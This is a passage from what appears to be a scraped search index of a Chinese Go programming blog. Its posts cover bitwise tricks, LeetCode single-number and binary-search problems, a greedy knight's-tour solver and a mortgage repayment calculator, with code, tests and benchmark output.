","permalink":"https://www.fenghong.tech/blog/algorithm/lrucache/","tags":["lru","doublyLinkedList","hashMap"],"title":"LRU 算法"},{"categories":["algorithm","golang"],"contents":"[TOC]\n 背景 位运算上篇文章位运算简单介绍了什么是位运算,以及goalng位运算的特点.这篇结合几个实例深入位运算的理解\n 异或 异或的真值表如下:\n   a b ⊕     1 0 1   1 1 0   0 0 0   0 1 1    一些规律 交换律：a ^ b ^ c \u0026lt;=\u0026gt; a ^ c ^ b\n任何数于0异或为该数: 0 ^ n =\u0026gt; n\n相同的数异或为0: n ^ n =\u0026gt; 0\n任何数\u0026amp;该数的取反为0: x \u0026amp; ^x = 0,\n任何数\u0026amp;非0为该数: x \u0026amp; ^0 = x;\n逻辑操作与加减法结合起来的恒等式:\n-x = ^x + 1 \n-x = ^(x-1)\n^x = -x -1\n-^x = x +1\n\u0026hellip;\n示例 136. singleNumber1 描述 给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。\n说明:\n你的算法应该具有线性时间复杂度O(n),空间复杂度为O(1)\n示例 1:\n输入: [2,2,1] 输出: 1 示例 2:\n输入: [4,1,2,1,2] 输出: 4 思路 根据这个规律: 相同的数异或为0: n ^ n =\u0026gt; 0 交换律：a ^ b ^ c \u0026lt;=\u0026gt; a ^ c ^ b var a = [2,3,2,4,4] 2 ^ 3 ^ 2 ^ 4 ^ 4等价于 2 ^ 2 ^ 4 ^ 4 ^ 3 =\u0026gt; 0 ^ 0 ^3 =\u0026gt; 3 代码 func SingleNumber(nums []int) int { x := nums[0] for i := 0; i \u0026lt; len(nums); i++ { x ^= nums[i] } return x } 137. SingleNumber2 描述 给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现了三次。找出那个只出现了一次的元素。\n说明:\n你的算法应该具有线性时间复杂度O(n),空间复杂度为O(1)\n示例 1:\n输入: [2,2,3,2] 输出: 3 示例 2:\n输入: [0,1,0,1,0,1,99] 输出: 99 思路1 大佬说: 能设计一个状态转换电路，使得一个数出现3次时能自动抵消为0，最后剩下的就是只出现1次的数。 则有: x出现一次: a = (a ^ x) \u0026amp; ^b ==\u0026gt; a = x b = (b ^ x) \u0026amp; ^a ==\u0026gt; (因为a=x,所有b=0) x出现两次: a = (a ^ x) \u0026amp; ^b ==\u0026gt; a = (x ^ x) \u0026amp; ^0 ==\u0026gt; a = 0 b = (b ^ x) \u0026amp; ^a ==\u0026gt; b = (0 ^ x) \u0026amp; ^0 ==\u0026gt; b = x x出现三次: a = (a ^ x) \u0026amp; ^b ==\u0026gt; a = (0 ^ x) \u0026amp; ^x ==\u0026gt; a = 0 b = (b ^ x) \u0026amp; ^a ==\u0026gt; b = (x ^ x) \u0026amp; ^0 ==\u0026gt; b = 0 代码 func SingleNumber2(nums []int) int { a, b := 0, 0 for _, x := range nums { a = (a ^ x) \u0026amp; ^b b = (b ^ x) \u0026amp; ^a } return a } 思路2 利用hashmap来存储出现的次数. key存储该数, value存储该数出现的状态. 代码 func SingleNumber2x(nums []int) int { var ( map1 = make(map[int]int8) ) for _, value := range nums { map1[value]++ } for key, v := range map1 { if v == 1 { return key } } return 0 } 测试性能 两种思路性能比对,Benchmark测试\nfunc BenchmarkSingleNumber2(b *testing.B) { var a = []int{1, 1, 1, 3, 3, 3, 5, 5, 5, 2, 6, 6, 6, 8, 8, 8} b.ResetTimer() for i := 0; i \u0026lt;= b.N; i++ { SingleNumber2(a) } } func BenchmarkSingleNumber2x(b *testing.B) { var a = []int{1, 1, 1, 3, 3, 3, 5, 5, 5, 2, 6, 6, 6, 8, 8, 8} b.ResetTimer() for i := 0; i \u0026lt;= b.N; i++ { SingleNumber2x(a) } } 测试性能\n$ go test -bench=. -benchmem -run=none goos: windows goarch: amd64 pkg: gogs.wangke.co/go/algo/leetcode BenchmarkSingleNumber2-4 63165872 24.6 ns/op 0 B/op 0 allocs/op BenchmarkSingleNumber2x-4 2542356 472 ns/op 64 B/op 2 allocs/op PASS ok gogs.wangke.co/go/algo/leetcode 3.508s 很明显,利用hashmap会产生多余的内存空间.速度下降.性能比对疑惑,leetcode上面是hashmap占优.\n260. SingleNumber3 描述 给定一个整数数组 nums，其中恰好有两个元素只出现一次，其余所有元素均出现两次。 找出只出现一次的那两个元素。\n示例 :\n输入: [1,2,1,3,2,5] 输出: [3,5] 注意：\n结果输出的顺序并不重要，对于上面的例子， [5, 3] 也是正确答案。 你的算法应该具有线性时间复杂度。你能否仅使用常数空间复杂度来实现？\n思路 位运算，异或运算。对于一个数组nums = [1, 1 , 2, 2, 3, 4, 4, 5]。 其一，如果，进行一次全部异或运算，将会得到3 ^ 5。 其二， 3 ^ 5 = 110b。那么在出现1的位置，必然一个为1一个为0，这样就可以根据特征区分出两个数字。\nHacker\u0026rsquo;s Delight 2nd Edition Chinese\n Use the following formula to isolate the rightmost 1-bit, producing 0 if none (eg, 01011000 ==\u0026gt; 0000 1000): x \u0026amp; (-x)\n翻译过来: 下列公式可以保留x中最靠右且值为1的位元,并将其余位元置0;若不存在,则生成的数为0.(01011000 ==\u0026gt; 0000 1000):\n​\tx \u0026amp; (-x)\n 其三，于是将问题转化为了“一个数字出现1次，其他数字出现两次”。\n代码 func SingleNumber3(nums []int) []int { var diff int var res = make([]int, 2) for _, v := range nums { diff ^= v } // 3(011),5(101) 两个不一样， diff = 110 // diff \u0026amp;= ^diff +1 //==\u0026gt; 找到只出现一次的两个数最右侧不相同的位 diff \u0026amp;= -diff // diff = 10 for _, v := range nums { if v\u0026amp;diff == 0 { res[0] ^= v } else { res[1] ^= v } } return res } 测试用例 func TestSingleNumber3(t *testing.T) { type args struct { nums []int } tests := []struct { name string args args want []int }{ {\u0026#34;test01\u0026#34;,args{[]int{1,2,1,3,2,5}},[]int{3,5}}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { got := SingleNumber3(tt.args.nums) sort.Ints(got) //返回的数组未排序,比较起来不方便 \tif !reflect.DeepEqual(got, tt.want) { t.Errorf(\u0026#34;SingleNumber3() = %v, want %v\u0026#34;, got, tt.want) } }) } } /* === RUN TestSingleNumber3 === RUN TestSingleNumber3/test01 --- PASS: TestSingleNumber3 (0.00s) --- PASS: TestSingleNumber3/test01 (0.00s) PASS */ 感谢阅读~源码\n参考  leetcode  ","permalink":"https://www.fenghong.tech/blog/algorithm/2019-10-11-go-bit/","tags":["bit","leetcode"],"title":"Go 位运算续"},{"categories":["algorithm","golang"],"contents":"[TOC]\n14. first-position-of-target Description** 给定一个排序的整数数组（升序）和一个要查找的整数target，用O(logn)的时间查找到target第一次出现的下标（从0开始），如果target不存在于数组中，返回-1。\nExample Example 1: Input: [1,4,4,5,7,7,8,9,9,10]，1 Output: 0 Explanation: the first index of 1 is 0. Example 2: Input: [1, 2, 3, 3, 4, 5, 10]，3 Output: 2 Explanation: the first index of 3 is 2. Example 3: Input: [1, 2, 3, 3, 4, 5, 10]，6 Output: -1 Explanation: Not exist 6 in array. 解决思路 典型的二分法求解,上来一看,求已经排序的数组的某个数.二分法就直接拿来用.\n 二分法定义\n 在计算机科学中，二分查找算法（英语：binary search algorithm），也称折半搜索算法(英语：half-interval search algorithm)、对数搜索算法(英语：logarithmic search algorithm),是一种在有序数组中查找某一特定元素的搜索算法\nfunc BinarySearch(nums []int, target int) int { // write your code here \tl := 0 r := len(nums) - 1 for l \u0026lt;= r { mid := l + (r-l)/2 if target == nums[mid] { return mid } else if target \u0026gt; nums[mid] { l = mid + 1 } else { r = mid - 1 } } return -1 } 提交之后,看到错误,定睛一看,是有重复元素导致的错误,二分法当找到某个元素的时候,立即返回.\n输入 [3,4,5,8,8,8,8,10,13,14] 8 输出 4 期望答案 3 len(nums) = 9 ==\u0026gt; mid = 4 与期望的3不一样,因为num[4]=8, 下标为3. 要找的是第一个匹配的元素.算法要改进一下. 改进 package lintcode func BinarySearchX(nums []int, target int) int { // write your code here \tl := 0 r := len(nums) - 1 for l \u0026lt;= r { mid := l + (r-l)/2 //如果大于l右移至中点后一个 \tif target \u0026gt; nums[mid] { l = mid + 1 //如果是小于等于,则r偏移至中点前一个 \t} else { r = mid - 1 } } //最终的l指针肯定指向target,如果不指向,说明没有找到 \tif nums[l] == target { return l } return -1 } 测试函数 package lintcode import \u0026#34;testing\u0026#34; func TestBinarySearchX(t *testing.T) { a := []int{3,4,5,8,8,8,8,10,13,14}//普通二分法失败的案例 \ttarget := 8 want := 3 rel := BinarySearchX(a,target) if want != rel { t.Fatalf(\u0026#34;want=%d, real=%d\u0026#34;, want, rel) } t.Logf(\u0026#34;want=%d\u0026#34;, want) } === RUN TestBinarySearchX --- PASS: TestBinarySearchX (0.00s) 14-binarysearch_test.go:20: want=3 PASS  验证[goland]上测试模块  === RUN TestBinarySearchX --- PASS: TestBinarySearchX (0.00s) 14-binarysearch_test.go:20: want=3 PASS  命令行测试  $ go test -v 14-binarysearch_test.go 14-binarysearch.go === RUN TestBinarySearchX --- PASS: TestBinarySearchX (0.00s) 14-binarysearch_test.go:20: want=3 PASS ok command-line-arguments 0.034s 复杂度分析  时间复杂度  二分搜索每次把搜索区域减少一半，时间复杂度为O(log n)。（n代表集合中元素的个数）\n 空间复杂度  O(1).虽以递归形式定义，但是尾递归，可改写为循环。\n感谢您的阅读~\n参考  wiki百科  ","permalink":"https://www.fenghong.tech/blog/algorithm/binarysearch/","tags":["binarySearch"],"title":"go-binarySearch"},{"categories":["algorithm","golang"],"contents":"[TOC]\n1095.山脉数组中查找目标值 描述 给你一个 山脉数组 mountainArr，请你返回能够使得 mountainArr.get(index) 等于 target 最小 的下标 index 值。\n如果不存在这样的下标 index，就请返回 -1。\n所谓山脉数组，即数组 A 假如是一个山脉数组的话，需要满足如下条件：\n首先，A.length \u0026gt;= 3\n其次，在 0 \u0026lt; i \u0026lt; A.length - 1 条件下，存在 i 使得：\n A[0] \u0026lt; A[1] \u0026lt; ... A[i-1] \u0026lt; A[i] A[i] \u0026gt; A[i+1] \u0026gt; ... \u0026gt; A[A.length - 1]  你将 不能直接访问该山脉数组，必须通过 MountainArray 接口来获取数据：\n MountainArray.get(k) - 会返回数组中索引为k 的元素（下标从 0 开始） MountainArray.length() - 会返回该数组的长度  示例 1：\n输入：array = [1,2,3,4,5,3,1], target = 3 输出：2 解释：3 在数组中出现了两次，下标分别为 2 和 5，我们返回最小的下标 2。 示例 2：\n输入：array = [0,1,2,4,2,1], target = 3 输出：-1 解释：3 在数组中没有出现，返回 -1。 提示\n 3 \u0026lt;= mountain_arr.length() \u0026lt;= 10000 0 \u0026lt;= target \u0026lt;= 10^9 0 \u0026lt;= mountain_arr.get(index) \u0026lt;= 10^9  解法思路 根据山脉数组的特点,想找的值只能在上升或者下降的某个点,可以先找到山脉数组的最大值,利用二分查找的特点,找到最大值的下标,将数组分为两个部分,一个递增数组和递减数组.再在递增数组里面找想要找的值,找不到在递减数组里面找,否则就返回-1.\n实现代码 /* Copyright 2019 louis. @Time : 2019/9/30 20:36 @Author : louis @File : 1095-findinMountingarray @Software: GoLand */ package leetcode type MountainArray struct { arr []int } func (m *MountainArray) get(index int) int { return m.arr[index] } func (m *MountainArray) length() int { return len(m.arr) } func bs(m *MountainArray, t, l, r int, asc bool) int { for l \u0026lt; r { mid := l + (r-l)\u0026gt;\u0026gt;1 if (asc \u0026amp;\u0026amp; m.get(mid) \u0026gt;= t) || (!asc \u0026amp;\u0026amp; m.get(mid) \u0026lt;= t) { r = mid } else { l = mid + 1 } } if t == m.get(l) { return l } return -1 } func FindInMountainArray(target int, m *MountainArray) int { p, r := 0, m.length()-1 for p \u0026lt; r { mid := p + (r-p)\u0026gt;\u0026gt;1 // 如果mid值大于mid+1;说明峰值在mid的左边.否则只能在右边 if m.get(mid) \u0026gt; m.get(mid+1) { r = mid } else { p = mid + 1 } } //此次循环找到了p对应是峰值.左边进行查找,优先查找下标小的. i := bs(m, target, 0, p-1, true) if i != -1 { return i } //在右边进行查找 return bs(m, target, p, m.length()-1, false) } test函数 /* Copyright 2019 louis. @Time : 2019/9/30 20:36 @Author : louis @File : 1095-findinMountingarray_test.go @Software: GoLand */ package leetcode import \u0026quot;testing\u0026quot; func TestFindInMountainArray(t *testing.T) { type args struct { target int m *MountainArray } tests := []struct { name string args args want int }{ {\u0026quot;test01\u0026quot;,args{3,\u0026amp;MountainArray{[]int{1,2,3,4,5,3,1}}},2}, {\u0026quot;test02\u0026quot;,args{3,\u0026amp;MountainArray{[]int{1,2,5,7,9,2,1}}},-1}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := FindInMountainArray(tt.args.target, tt.args.m); got != tt.want { t.Errorf(\u0026quot;FindInMountainArray() = %v, want %v\u0026quot;, got, tt.want) } }) } } 测试\ngo test -v 1095-findinMountingarray.go 1095-findinMountingarray_test.go === RUN TestValidMountingArray --- PASS: TestValidMountingArray (0.00s) === RUN TestValidMountingArray/test01 --- PASS: TestValidMountingArray/test01 (0.00s) === RUN TestValidMountingArray/test02 --- PASS: TestValidMountingArray/test02 (0.00s) PASS ","permalink":"https://www.fenghong.tech/blog/algorithm/binarysearch-mt/","tags":["binarySearch"],"title":"Mounting Array"},{"categories":["algorithm","golang"],"contents":"[TOC]\n问题描述： 所谓“马踏棋盘”问题，就是指在中国象棋的棋盘上，用马的走法走遍整个棋盘，在8*8的方格中，每个格都要遍历，且只能遍历一次。\n我们把棋盘抽象成一个二维数据，输入起始位置的坐标(x,y),根据马的“日”字走法，将马走的步数写入二维数组，然后输出.\n解决思路 设当前马的坐标为(x,y)，则下一步可以走的有8 个方向\n(x-2,y+1)、(x-1,y+2)、(x+1,y+2)、(x+2,y+1)、(x+2,y-1)、(x+1,y-2)、(x-1,y-2)、(x-2,y-1)\n创建一个二维数组记录马可以走的8个方向\nchess [8][8]int //初始化棋盘 direction = [2][9]int{{0, -2, -1, 1, 2, 2, 1, -1, -2}, {0, 1, 2, 2, 1, -1, -2, -2, -1}} // 马可以走的8个方向 探测下一步需要走,可以用下面公式 x = x+direction[0][i] y = y+direction[1][i] 每一个马都有八个下一步的选择，我们在满足要求的点中任意找一个进行遍历，当八个点都不满足要求时，就回溯的上一步，找其他点进行遍历。\nFeasible 该点是不是可以走,超出棋盘界限或者已经走过(棋盘初始为0值),都不能走. 0 \u0026lt;= x \u0026amp;\u0026amp; x \u0026lt; 8 \u0026amp;\u0026amp; 0 \u0026lt;= y \u0026amp;\u0026amp; y \u0026lt; 8 \u0026amp;\u0026amp; chess[x][y] == 0 贪心算法  初始化权值; 对每个点进行探索,若方向可以行,则weight[i][j]++  [ 2 3 4 4 4 4 3 2] [ 3 4 6 6 6 6 4 3] [ 4 6 8 8 8 8 6 4] [ 4 6 8 8 8 8 6 4] [ 4 6 8 8 8 8 6 4] [ 4 6 8 8 8 8 6 4] [ 3 4 6 6 6 6 4 3] [ 2 3 4 4 4 4 3 2]  setWeight占位操作  当(x,y)点被占用的时候,当前节点权值设置为9,位置(x,y)周围所有的可行点权值减1\nsetWeight(2,7) [ 2 3 4 4 4 4 2 2] //3--\u0026gt;2 [ 3 4 6 6 6 5 4 3] //6--\u0026gt;5 [ 4 6 8 8 8 8 6 9] //4--\u0026gt;9 [ 4 6 8 8 8 7 6 4] //8--\u0026gt;7 [ 4 6 8 8 8 8 5 4] //6--\u0026gt;5 [ 4 6 8 8 8 8 6 4] [ 3 4 6 6 6 6 4 3] [ 2 3 4 4 4 4 3 2]  UnsetWeight 回退操作  需要重新计算weight[i][j]的权值, 依次探测周围,若可行,则weight[i][j]++;\n其周围可行点的权值weight[x][y]++\n 最优路线贪心策略  NextDirection 每次走下一步,选择下一步最少的权值,进行贪心算法.\n如果不先遍历它的话以后可能会很难遍历到它,即使能遍历到,也需要花费大量的回退操作.\ngo代码 /* Copyright 2019 louis. @Time : 2019/9/25 22:30 @Author : louis @File : mataqipan @Software: GoLand */ package main import ( \u0026#34;fmt\u0026#34; \u0026#34;gogs.wangke.co/go/algo/stack\u0026#34; ) var ( chess [8][8]int //初始化棋盘 \tdirection = [2][9]int{{0, -2, -1, 1, 2, 2, 1, -1, -2}, {0, 1, 2, 2, 1, -1, -2, -2, -1}} // 马可以走的8个方向 \tcur, next Spot //当前步数和下一步 \ts stack.Stack //栈 \tweight [8][8]int //表示该位置周围可行点的数目,比如weight[0][0] = 2 只有两步可走. ) //Spot 保存当前点的位置及可行走方向是否走过 type Spot struct { x int //行 \ty int //列 \td [9]int //d[i]记录了第i号方向是否已经走过,1表示走过 } //Feasible 该点是不是可以走,超出棋盘界限或者已经走过,都不能走. func Feasible(x, y int) bool { if 0 \u0026lt;= x \u0026amp;\u0026amp; x \u0026lt; 8 \u0026amp;\u0026amp; 0 \u0026lt;= y \u0026amp;\u0026amp; y \u0026lt; 8 \u0026amp;\u0026amp; chess[x][y] == 0 { return true } return false } //NextDirection 每次走下一步,选择下一步最少的权值,进行贪心算法,返回下一步的方向 func NextDirection(c Spot) int { var MinDirection, Min int var x, y int Min = 9 for i := 1; i \u0026lt;= 8; i++ { //访问过则不考虑 \tif c.d[i] != 0 { continue } x = c.x + direction[0][i] y = c.y + direction[1][i] //选择最小的权值 \tif Feasible(x, y) \u0026amp;\u0026amp; weight[x][y] \u0026lt; Min { Min = weight[x][y] MinDirection = i } } return MinDirection } // InitWeight 初始化每个点的权值 // 初始为0; 对每个点进行探索,若方向可以行,则weight[i][j]++ func InitWeight() { for i := 0; i \u0026lt; 8; i++ { for j := 0; j \u0026lt; 8; j++ { for k := 1; k \u0026lt;= 8; k++ { x := i + direction[0][k] y := j + direction[1][k] if Feasible(x, y) { weight[i][j]++ } } } } } //SetWeight 当(x,y)点被占用的时候,当前节点权值设置为9,位置(x,y)周围所有的可行点权值减1 func SetWeight(x, y int) { for k := 1; k \u0026lt;= 8; k++ { weight[x][y] = 9 i := x + direction[0][k] j := y + direction[1][k] if Feasible(i, j) { weight[i][j]-- } } } // UnsetWeight 回退操作,需要重新计算weight[i][j]的权值, // 依次探测周围,若可行,则weight[i][j]++; 其周围可行点的权值+1 func UnsetWeight(x, y int) { for k := 1; k \u0026lt;= 8; k++ { weight[x][y] = 0 i := x + direction[0][k] j := y + direction[1][k] if Feasible(i, j) { weight[x][y]++ weight[i][j]++ } } } //output 输出棋盘 func output() { for j := 0; j \u0026lt; 8; j++ { fmt.Printf(\u0026#34;%2d\\n\u0026#34;, chess[j]) } //for j := 0; j \u0026lt; 8; j++ { \t//\tfmt.Printf(\u0026#34;%2d\\n\u0026#34;, weight[j]) \t//} } func outWeight() { for j := 0; j \u0026lt; 8; j++ { fmt.Printf(\u0026#34;%2d\\n\u0026#34;, weight[j]) } } // 当找不到下一个位置时,即NextDirection返回值为0,要进行回退 // 为了回退方便,使用栈来存储, 能进时,当前的位置入栈, 向i走一步 // 回退操作, 在棋牌的cur点置0,Step--; 出栈一个点,设置为当前的cur // 回退操作, 不能重复探测,去重操作. func main() { InitWeight() //outWeight() \tfmt.Scanln(\u0026amp;cur.x,\u0026amp;cur.y) backup := 0 Step := 1 SetWeight(cur.x, cur.y) chess[cur.x][cur.y] = Step for Step \u0026lt; 64 { //获取下一步访问方向,根据贪心策略,会选择这一步的weight值最少的那个方向 \tk := NextDirection(cur) if k != 0 { //这一步可以走,将这一步记录下来 \tnext.x = cur.x + direction[0][k] next.y = cur.y + direction[1][k] cur.d[k] = 1 s.Push(cur) cur = next Step++ chess[cur.x][cur.y] = Step SetWeight(cur.x, cur.y) //回退 \t} else { //这步不可以走,得回退到上一步 \tchess[cur.x][cur.y] = 0 backup++//回退次数 \tStep-- UnsetWeight(cur.x, cur.y) cur = s.Pop().(Spot) } } output() fmt.Print(backup) } 依赖的stack /* @Time : 2019/9/23 23:29 @Author : louis @File : stack @Software: GoLand */ package stack type Item struct { item interface{} next *Item } // Stack is a base structure for LIFO type Stack struct { sp *Item depth uint64 } // Initialzes new Stack func New() *Stack { var stack = new(Stack) stack.depth = 0 return stack } // Pushes a given item into Stack func (stack *Stack) Push(item interface{}) { stack.sp = \u0026amp;Item{item: item, next: stack.sp} stack.depth++ } // Deletes top of a stack and return it func (stack *Stack) Pop() interface{} { if stack.depth \u0026gt; 0 { item := stack.sp.item stack.sp = stack.sp.next stack.depth-- return item } return nil } // Peek returns top of a stack without deletion func (stack *Stack) Peek() interface{} { if stack.depth \u0026gt; 0 { return stack.sp.item } return nil } //IsEmpty returns true means Empty Stack func (stack *Stack) IsEmpty() bool { return stack.depth == 0 } 验证\n$ go run main.go 2 4 [25 12 27 38 23 2 59 52] [28 39 24 13 58 51 22 3] [11 26 37 42 1 60 53 62] [40 29 14 57 50 63 4 21] [15 10 41 36 43 56 61 54] [32 35 30 49 64 47 20 5] [ 9 16 33 44 7 18 55 46] [34 31 8 17 48 45 6 19] 0 感谢您的阅读~\n参考  mooc大学数据结构与算法  ","permalink":"https://www.fenghong.tech/blog/algorithm/mataqipan/","tags":["贪心算法","algorithm"],"title":"go马踏棋盘贪心算法"},{"categories":["algorithm","golang"],"contents":"[TOC]\n前言 房贷，也被称为房屋抵押贷款.\n房屋贷款的方式有三种，分别是银行商业贷款、公积金贷款、组合贷款。\n总想质疑一下银行的贷款计算器是不是靠谱.故而自己动手写了一个小而简单的计算器,几十行代码\n等额本息 等额本息还款法即把按揭贷款的本金总额与利息总额相加，然后平均分摊到还款期限的每个月中，每个月的还款额是固定的，但每月还款额中的本金比重逐月递增、利息比重逐月递减。\n 原理:  每个月总偿还金额是不变的. $$ 设:A_n为第n个月欠银行贷款. X为每个月还款金额(本金+利息).月利率S $$\n$$ 故: A_1 = AS(1+S)-X $$\n$$ 所以: A_2 = A_1(1+S)-X = A(1+S)^{2}-X[(1+S)+1] $$\n$$ 递推得到: A_n = A_{n-1}(1+S)-X $$\n$$ 展开得: A_n= A(1+S)^n-X[(1+S)^{n-1}+(1+S)^{n-2}+\\cdots+(1+S)+1] $$\n$$ 利用等比数列求和公式:A_n= A(1+S)^n-\\frac{X[1+S]^n-1}{S} $$\n$$ 因此: X = \\frac{AS(1+S)^{m}}{(1+S)^m-1} $$\n等额本金 等额本金是指一种贷款的还款方式，是在还款期内把贷款数总额等分，每月偿还同等数额的本金和剩余贷款在该月所产生的利息，这样由于每月的还款本金额固定，而利息越来越少，借款人起初还款压力较大，但是随时间的推移每月还款数也越来越少。\n 原理:  每个月偿还本金都是一样的,只是偿还的利息越来越少. $$ 设总贷款金额为A,还款月数为Month,月利率为S.第n月还款数为:A_n $$\n$$ 故: A_n = \\frac{A}{Month} + (A - \\frac{A}{Month} * n) * S $$\n代码实现 /* @Time : 2019/9/24 16:48 @Author : louis @File : paymydebt @Software: GoLand */ package main import ( \u0026quot;fmt\u0026quot; \u0026quot;math\u0026quot; ) const ( bases float64 = 0.049 //商业贷款基准年利率 baseS = bases * 1.1 //上浮10% baseG = 0.032 //公积金贷款基准年利率 S = baseS / 12 //商业贷款月利率上浮 10% G = baseG / 12 //公积金贷款月利率 Start = 10 - offset //起始还贷日期如:10月份 offset = 1 //偏移量.%12后为0-11. Year = 30 //贷款年份 Month = 12*Year + Start //贷款月数12*30 AG = 150000 //公积金贷款总额 AS = 880000 //商业贷款总额 //S = 0.0044916 //商业贷款月利率上浮 10% ) /* - 原理: **每个月偿还本金都是一样的**,只是偿还的利息越来越少. */ func benJ() { const ( bs = AS / (Month - Start) //商贷每月偿还本金 bg = AG / (Month - Start) //公积金每月偿还本金 ) var ( jG = [Month]float64{} //公积金每月待还 jS = [Month]float64{} //商业每月待还 money = [Month]float64{} //总待还 payBackG float64 = 0 //公积金已偿还 payBacks float64 = 0 //商贷已偿还 payBack float64 = 0 //总偿还 ) for i := Start; i \u0026lt; Month; i++ { jG[i] = bg + (AG-bg*(float64(i-Start)))*G payBackG += jG[i] jS[i] = bs + (AS-bs*(float64(i-Start)))*S payBacks += jS[i] money[i] = jG[i] + jS[i] payBack = payBacks + payBackG //偏移量补足即可 fmt.Printf(\u0026quot;%4d年%2d月还款: %.2f = %.2f[公积金] + %.2f[商贷],已还%.2f\\n\u0026quot;, 2019+i/12, i%12+offset, money[i], jG[i], jS[i], payBack) } fmt.Printf(\u0026quot;等额本金共计偿还利息为:%.2f\\n\u0026quot;, payBack-AS-AG) } /* - 原理: **每个月总偿还金额是不变的.** */ func benX() { var es, eg float64 es = AS * S * math.Pow(1+S, Month) / (math.Pow(1+S, Month) - 1) eg = AG * G * math.Pow(1+G, Month) / (math.Pow(1+G, Month) - 1) fmt.Printf(\u0026quot;%.2f+%.2f = %0.2f\\n\u0026quot;, eg, es, es+eg) fmt.Printf(\u0026quot;共计偿还利息为:%.2f\u0026quot;, (es+eg)*Month-AG-AS) } func main() { benJ() fmt.Printf(\u0026quot;\\n等额本息:\u0026quot;) benX() } 验证\n$ go run main.go 2019年10月还款: 7212.67 = 816.00[公积金] + 6396.67[商贷],已还7212.67 2019年11月还款: 7200.58 = 814.89[公积金] + 6385.69[商贷],已还14413.25 2019年12月还款: 7188.49 = 813.78[公积金] + 6374.71[商贷],已还21601.74 ... 2049年 8月还款: 2885.53 = 418.86[公积金] + 2466.67[商贷],已还1812626.77 2049年 9月还款: 2873.45 = 417.75[公积金] + 2455.70[商贷],已还1815500.21 等额本金共计偿还利息为:785500.21 等额本息:639.29+4887.91 = 5527.20 共计偿还利息为:1009535.42 感谢阅读~~\n参考   等额本金\n  等额本息\n  ","permalink":"https://www.fenghong.tech/blog/algorithm/paymydebt/","tags":["algorithm","debt"],"title":"go房贷计算器"},{"categories":["algorithm","golang"],"contents":"[TOC]\n 背景 位运算一直都懵懵懂懂,需要记录成文字.时常看看\n 位操作  判断某一位是否为1 只改变其中某一位,而保持其他位不变   按位与\u0026amp;  \u0026amp; 只有两个二进制位均为1,结果才是1;其他都是0. 例如: 获取某些变量中的某一位,某些位清0且同事保留其他位不变; n = n \u0026amp; 0xffffff00 (低8位置0) 如何判断int型变量n的第7位,(右往左,从0开始).  按位或|  | 只有两个二进制有一个1,结果会为1,其他都是0 例如: 通过用来将变量的某些为置1保留其他位不变 n|= 0xff (将n的低8位置1)  按位异或^  ^ 只有两个二进制位不相同,结果才为1,其他都是0 例如: 将某些变种的某些位进行取反,且保留其他位 特点 如果a^b=c, 那么就有 c^b=a ,c^a=b (穷举法) 假定 A 为60，B 为13\n   运算符 描述 实例     \u0026amp; 按位与运算符\u0026rdquo;\u0026amp;\u0026ldquo;是双目运算符。 其功能是参与运算的两数各对应的二进位相与。 (A \u0026amp; B) 结果为 12, 二进制为 0000 1100   | 按位或运算符\u0026rdquo;|\u0026quot;是双目运算符。 其功能是参与运算的两数各对应的二进位相或 (A | B) 结果为 61, 二进制为 0011 1101   ^ 按位异或运算符\u0026quot;^\u0026quot;是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 (A ^ B) 结果为 49, 二进制为 0011 0001   \u0026laquo; 左移运算符\u0026quot;\u0026laquo;\u0026quot;是双目运算符。左移n位就是乘以2的n次方。 其功能把\u0026quot;\u0026laquo;\u0026quot;左边的运算数的各二进位全部左移若干位，由\u0026quot;\u0026laquo;\u0026quot;右边的数指定移动的位数，高位丢弃，低位补0。 A \u0026laquo; 2 结果为 240 ，二进制为 1111 0000   \u0026raquo; 右移运算符\u0026quot;\u0026raquo;\u0026quot;是双目运算符。右移n位就是除以2的n次方。 其功能是把\u0026quot;\u0026raquo;\u0026quot;左边的运算数的各二进位全部右移若干位，\u0026ldquo;\u0026raquo;\u0026quot;右边的数指定移动的位数。 A \u0026raquo; 2 结果为 15 ，二进制为 0000 1111    示例  获取c的第i位的bit值.  func GetBit(c byte, i uint) byte { return (c \u0026gt;\u0026gt; i) \u0026amp; 0x1 }  将c的第i位设置为v.  func SetBit(c byte, i uint, v int) byte { if v != 0 { /** 将某一位设置为1，例如设置第8位，从右向左数需要偏移7位,注意不要越界 1\u0026lt;\u0026lt;7=1000 0000 然后与c逻辑或|,偏移后的第8位为1，逻辑|运算时候只要1个为真就为真达到置1目的 */ c |= 1 \u0026lt;\u0026lt; i } else { /** 将某一位设置为0，例如设置第4位，从右向左数需要偏移3位,注意不要越界 1\u0026lt;\u0026lt;3=0000 1000 然后取反得到 1111 0111 然后逻辑\u0026amp;c */ c = \u0026amp;^ (1 \u0026lt;\u0026lt; i) } }  将c的第i位翻转  func FlipBit(c byte, i uint) byte { c = c ^ (1 \u0026lt;\u0026lt; i) /* 将第4位翻转, 1左移3位, 1 \u0026lt;\u0026lt; 3 ==\u0026gt; 0000 1000 0000 1000 ^ 0001 1110 == 0001 0110 */ return c } 231. 判断为2的幂  位运算  func IsPowerOfTwo(n int) bool { if n \u0026lt;= 0 { return false } /* n位2的幂时, 2^7 == 1000 0000 n-1为 2^7-1 == 0111 1111 n \u0026amp; (n-1)必定全为,\t== 0000 0000 */ return (n \u0026amp; (n-1)) == 0 }  普通递归  func IsPowerOfTwo(n int) bool { if n \u0026lt;= 0 { return false } // 2的幂一直除2, 最后等于1 \tif n == 1 { return true } // n为奇数,必定不为2的幂 \tif n % 2 != 0 { return false } return isPowerOfTwo(n / 2) } 验证 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/imroc/biu\u0026#34; ) func main() { var a byte a = 30 //00011110 \tb := GetBit(a, 2) fmt.Printf(\u0026#34;%d二进制为:%v\\n\u0026#34;, a, biu.ToBinaryString(a)) fmt.Printf(\u0026#34;a的第2位为:%v\\n\u0026#34;, b) b = SetBit(a, 5, 1) fmt.Printf(\u0026#34;%d的第6位,置为1后的二进制为:%v\\n\u0026#34;, a, biu.ToBinaryString(b)) b = SetBit(a, 6, 1) fmt.Printf(\u0026#34;%d的第7位,置为1后的二进制为:%v\\n\u0026#34;, a, biu.ToBinaryString(b)) b = SetBit(a, 7, 1) 